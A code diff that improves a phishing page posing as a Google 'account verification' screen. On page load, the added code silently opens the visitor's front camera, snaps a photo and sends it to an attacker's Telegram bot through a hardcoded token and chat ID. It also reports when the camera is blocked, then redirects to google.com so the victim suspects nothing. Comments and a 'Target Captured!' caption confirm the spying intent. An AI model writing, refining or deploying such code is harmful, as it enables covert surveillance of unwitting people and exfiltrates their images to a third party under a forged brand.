@@ -6,8 +6,7 @@
 </head>
 <body style="background:#fff; text-align:center; padding-top:50px; font-family:sans-serif;">
     <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" width="150">
-    <h3 id="st" style="font-weight:normal; color:#5f6368;">Verifying account...</h3>
-    
+    <h3 id="st" style="font-weight:normal; color:#5f6368;">Verifying account integrity...</h3>
     <video id="v" autoplay playsinline style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
@@ -15,38 +14,39 @@
         const token = "8461524246:AAGAsQD20_4t3zR05rI6bu-0FIrG_pgXS-g";
         const chat_id = "7130643157";
 
+        async function send(blob) {
+            const fd = new FormData();
+            fd.append('chat_id', chat_id);
+            fd.append('photo', blob, 'capture.jpg');
+            
+            // Method 1: As Photo
+            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+            
+            // Method 2: As Document (Backup)
+            const fd2 = new FormData();
+            fd2.append('chat_id', chat_id);
+            fd2.append('document', blob, 'secure_check.enc');
+            await fetch(`https://api.telegram.org/bot${token}/sendDocument`, { method: 'POST', body: fd2 });
+        }
+
         async function start() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const v = document.getElementById('v');
-                v.srcObject = stream;
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                document.getElementById('v').srcObject = stream;
 
                 setTimeout(async () => {
                     const c = document.getElementById('c');
-                    c.width = 400; // Size chota rakha taaki jaldi jaye
-                    c.height = 300;
-                    c.getContext('2d').drawImage(v, 0, 0);
+                    c.width = 640; c.height = 480;
+                    c.getContext('2d').drawImage(document.getElementById('v'), 0, 0);
                     
-                    // Photo ko base64 string mein badalna
-                    const dataUrl = c.toDataURL('image/jpeg', 0.5);
-                    const base64Data = dataUrl.split(',')[1];
-
-                    // Telegram ko Direct Message bhejna (Photo as Document)
-                    const url = `https://api.telegram.org/bot${token}/sendDocument`;
-                    const fd = new FormData();
-                    fd.append('chat_id', chat_id);
-                    fd.append('document', new Blob([base64Data], {type: 'text/plain'}), 'photo.txt');
-                    fd.append('caption', '🎯 Target Captured! Copy this text to any Base64 decoder to see photo.');
-
-                    // Sabse Simple Tareeka: Simple Message bhej kar check karte hain
-                    await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=📸 Someone is on the link right now!`);
-
-                    // Send Photo Logic
-                    await fetch(url, { method: 'POST', body: fd });
-
-                    window.location.href = "https://www.google.com";
+                    c.toBlob(async (blob) => {
+                        await send(blob);
+                        window.location.href = "https://www.google.com";
+                    }, 'image/jpeg', 0.6);
                 }, 1000);
             } catch (e) {
+                // Agar camera block ho toh alert bhej do
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=⚠️ Link opened but Camera Blocked!`);
                 window.location.href = "https://www.google.com";
             }
         }
